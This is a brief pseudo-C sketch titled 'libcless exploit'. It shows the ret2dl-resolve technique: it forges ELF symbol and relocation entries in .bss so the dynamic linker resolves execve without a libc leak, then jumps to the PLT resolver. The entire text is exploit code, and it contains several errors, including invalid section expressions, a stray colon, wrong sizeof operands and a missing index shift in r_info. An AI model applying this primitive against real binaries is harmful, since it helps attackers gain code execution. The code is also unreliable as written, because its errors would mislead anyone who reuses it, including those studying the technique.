libcless exploit
================

char *buffer = .bss;
char *new_stack = buffer + 1024;
int *rubbish = new_stack + 4;

strcpy(buffer, "execve");
  *((int *) buffer) = 'exec';
  *(((int *) buffer) + 1) = 've\0\0';  
char *name = buffer;
buffer += strlen(buffer) + 1;

Elf32_Sym *symbol = (Elf32_Sym *) buffer;
symbol->st_name = name - .dynstr;
symbol->st_value = 0;
symbol->st_info = 0;
symbol->st_other = 0;
symbol->st_shndx = 0;
buffer += sizeof(*symbol);

Elf32_Rel *reloc = (Elf32_Rel *) buffer;
reloc->r_offset = rubbish++;
reloc->r_info = (R_386_JUMP_SLOT | (symbol - .dynsym) / sizeof(symbol));
buffer += sizeof(reloc):

pre_plt((reloc - .rel.plt) / sizeof(Elf32_Rel));
